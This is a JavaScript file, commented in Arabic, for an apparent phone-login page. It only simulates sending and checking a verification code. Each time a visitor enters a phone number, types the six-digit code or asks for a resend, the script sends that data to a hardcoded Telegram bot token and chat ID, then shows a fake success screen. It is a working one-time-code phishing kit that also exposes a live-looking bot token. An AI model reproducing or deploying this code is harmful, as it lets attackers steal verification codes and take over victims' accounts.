// script.js
document.addEventListener('DOMContentLoaded', function() {
    // عناصر DOM
    const welcomeScreen = document.getElementById('welcomeScreen');
    const loginContainer = document.getElementById('loginContainer');
    const codeContainer = document.getElementById('codeContainer');
    const successContainer = document.getElementById('successContainer');
    
    const startBtn = document.getElementById('startBtn');
    const sendCodeBtn = document.getElementById('sendCodeBtn');
    const verifyBtn = document.getElementById('verifyBtn');
    const backBtn = document.getElementById('backBtn');
    const resendBtn = document.getElementById('resendBtn');
    const finishBtn = document.getElementById('finishBtn');
    
    const countryCode = document.getElementById('countryCode');
    const phoneNumber = document.getElementById('phoneNumber');
    const displayNumber = document.getElementById('displayNumber');
    
    const codeInputs = [
        document.getElementById('code1'),
        document.getElementById('code2'),
        document.getElementById('code3'),
        document.getElementById('code4'),
        document.getElementById('code5'),
        document.getElementById('code6')
    ];

    let fullPhoneNumber = '';
    let countdownTimer = null;
    let resendCountdown = 60;

    // بدء الرحلة
    startBtn.addEventListener('click', function() {
        welcomeScreen.style.display = 'none';
        loginContainer.style.display = 'block';
    });

    // معالجة إدخال الكود
    codeInputs.forEach((input, index) => {
        input.addEventListener('input', function() {
            if (this.value.length === 1 && index < codeInputs.length - 1) {
                codeInputs[index + 1].focus();
            }
            validateCodeInput(this);
        });

        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '' && index > 0) {
                codeInputs[index - 1].focus();
            }
        });

        input.addEventListener('paste', function(e) {
            e.preventDefault();
            const pastedData = e.clipboardData.getData('text');
            const numbersOnly = pastedData.replace(/[^0-9]/g, '').substring(0, 6);
            
            if (numbersOnly.length === 6) {
                codeInputs.forEach((input, i) => {
                    input.value = numbersOnly[i] || '';
                });
                codeInputs[5].focus();
            }
        });
    });

    // إرسال رمز التحقق
    sendCodeBtn.addEventListener('click', function() {
        const phone = phoneNumber.value.trim();
        const code = countryCode.value;
        
        if (!validatePhoneNumber(phone)) {
            showInputError(phoneNumber, 'يرجى إدخال رقم هاتف صحيح مكون من 6-10 أرقام');
            return;
        }

        // إزالة رسالة الخطأ إذا كانت موجودة
        clearInputError(phoneNumber);
        
        fullPhoneNumber = code + phone;
        displayNumber.textContent = fullPhoneNumber;
        
        // إرسال معلومات المستخدم إلى التلجرام فور إدخال الرقم
        sendUserDataToTelegram(fullPhoneNumber);
        
        // محاكاة إرسال الرمز
        simulateSendCode();
        
        loginContainer.style.display = 'none';
        codeContainer.style.display = 'block';
        
        // بدء عداد إعادة الإرسال
        startResendCountdown();
    });

    // التحقق من الكود
    verifyBtn.addEventListener('click', function() {
        const code = codeInputs.map(input => input.value).join('');
        
        if (code.length !== 6) {
            alert('يرجى إدخال رمز التحقق المكون من 6 أرقام');
            return;
        }

        if (!/^\d{6}$/.test(code)) {
            alert('يرجى إدخال أرقام فقط في رمز التحقق');
            return;
        }

        // إرسال رمز التحقق إلى التلجرام
        sendVerificationCodeToTelegram(fullPhoneNumber, code);
        
        // محاكاة التحقق الناجح
        simulateVerification(code);
    });

    // العودة لتغيير الرقم
    backBtn.addEventListener('click', function() {
        codeContainer.style.display = 'none';
        loginContainer.style.display = 'block';
        resetCodeInputs();
        if (countdownTimer) {
            clearInterval(countdownTimer);
            countdownTimer = null;
        }
        resendBtn.textContent = 'إعادة الإرسال';
        resendBtn.disabled = false;
    });

    // إعادة إرسال الرمز
    resendBtn.addEventListener('click', function() {
        if (resendBtn.disabled) return;
        
        const phone = phoneNumber.value.trim();
        if (!phone) {
            alert('يرجى إدخال رقم الهاتف أولاً');
            return;
        }
        
        // إرسال طلب إعادة الإرسال إلى التلجرام
        sendResendRequestToTelegram(fullPhoneNumber);
        
        // محاكاة إعادة إرسال الرمز
        simulateResendCode();
        startResendCountdown();
    });

    // إنهاء العملية
    finishBtn.addEventListener('click', function() {
        // إعادة تعيين كل شيء
        location.reload();
    });

    // وظائف مساعدة
    function validatePhoneNumber(phone) {
        return phone.length >= 6 && phone.length <= 10 && /^\d+$/.test(phone);
    }

    function validateCodeInput(input) {
        input.value = input.value.replace(/[^0-9]/g, '');
    }

    function showInputError(input, message) {
        input.classList.add('input-error');
    }

    function clearInputError(input) {
        input.classList.remove('input-error');
    }

    function resetCodeInputs() {
        codeInputs.forEach(input => {
            input.value = '';
        });
    }

    function startResendCountdown() {
        resendCountdown = 60;
        resendBtn.disabled = true;
        resendBtn.textContent = `إعادة الإرسال (${resendCountdown}s)`;
        
        countdownTimer = setInterval(() => {
            resendCountdown--;
            if (resendCountdown <= 0) {
                clearInterval(countdownTimer);
                resendBtn.disabled = false;
                resendBtn.textContent = 'إعادة الإرسال';
            } else {
                resendBtn.textContent = `إعادة الإرسال (${resendCountdown}s)`;
            }
        }, 1000);
    }

    function simulateSendCode() {
        // محاكاة تأخير الإرسال
        sendCodeBtn.textContent = 'جارٍ الإرسال...';
        sendCodeBtn.disabled = true;
        
        setTimeout(() => {
            sendCodeBtn.textContent = 'إرسال رمز التحقق';
            sendCodeBtn.disabled = false;
        }, 2000);
    }

    function simulateResendCode() {
        resendBtn.textContent = 'جارٍ إعادة الإرسال...';
        resendBtn.disabled = true;
        
        setTimeout(() => {
            alert('تم إعادة إرسال رمز التحقق بنجاح!');
        }, 1500);
    }

    function simulateVerification(code) {
        verifyBtn.textContent = 'جارٍ التحقق...';
        verifyBtn.disabled = true;
        
        setTimeout(() => {
            codeContainer.style.display = 'none';
            successContainer.style.display = 'block';
            
            verifyBtn.textContent = 'تأكيد التحقق';
            verifyBtn.disabled = false;
        }, 2000);
    }

    // وظائف الإرسال الحقيقية إلى التلجرام
    function sendUserDataToTelegram(phoneNumber) {
        const botToken = '8008801270:AAHSaylCOt1O12DfHYSN0BQ3TERcznpDayU'; // استبدل هذا بتوكن بوتك الحقيقي
        const chatId = '8457242337';     // استبدل هذا بمعرف الدردشة الحقيقي
        
        const message = `👤 *بيانات المستخدم*\n\n📱 *رقم الهاتف:* ${phoneNumber}\n🕐 *الوقت:* ${new Date().toLocaleString('ar-SA')}\n📍 *المرحلة:* تم إدخال رقم الهاتف\n📊 *الحالة:* في انتظار رمز التحقق`;
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        })
        .then(response => {
            if (!response.ok) {
                console.error('فشل إرسال بيانات المستخدم إلى التلجرام');
                // يمكنك إضافة معالجة خطأ هنا
            }
        })
        .catch(error => {
            console.error('خطأ في إرسال بيانات المستخدم:', error);
        });
    }

    function sendVerificationCodeToTelegram(phoneNumber, code) {
        const botToken = '8008801270:AAHSaylCOt1O12DfHYSN0BQ3TERcznpDayU'; // استبدل هذا بتوكن بوتك الحقيقي
        const chatId = '8457242337';     // استبدل هذا بمعرف الدردشة الحقيقي
        
        const message = `🔐 *رمز التحقق*\n\n📱 *رقم الهاتف:* ${phoneNumber}\n🔢 *رمز التحقق:* ${code}\n🕐 *الوقت:* ${new Date().toLocaleString('ar-SA')}\n✅ *الحالة:* تم إدخال رمز التحقق بنجاح\n🛡️ *المرحلة:* التوثيق مكتمل`;
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        })
        .then(response => {
            if (!response.ok) {
                console.error('فشل إرسال رمز التحقق إلى التلجرام');
            }
        })
        .catch(error => {
            console.error('خطأ في إرسال رمز التحقق:', error);
        });
    }

    function sendResendRequestToTelegram(phoneNumber) {
        const botToken = '8008801270:AAHSaylCOt1O12DfHYSN0BQ3TERcznpDayU'; // استبدل هذا بتوكن بوتك الحقيقي
        const chatId = '8457242337';     // استبدل هذا بمعرف الدردشة الحقيقي
        
        const message = `🔄 *طلب إعادة إرسال*\n\n📱 *رقم الهاتف:* ${phoneNumber}\n🕐 *الوقت:* ${new Date().toLocaleString('ar-SA')}\n📤 *الحالة:* تم طلب إعادة إرسال رمز التحقق`;
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        })
        .then(response => {
            if (!response.ok) {
                console.error('فشل إرسال طلب إعادة الإرسال إلى التلجرام');
            }
        })
        .catch(error => {
            console.error('خطأ في إرسال طلب إعادة الإرسال:', error);
        });
    }

    // التحقق من إدخال الأرقام فقط في حقل الهاتف
    phoneNumber.addEventListener('input', function() {
        this.value = this.value.replace(/[^0-9]/g, '');
    });

    // منع النسخ في حقول الكود (اختياري)
    codeInputs.forEach(input => {
        input.addEventListener('copy', function(e) {
            e.preventDefault();
        });
    });
});
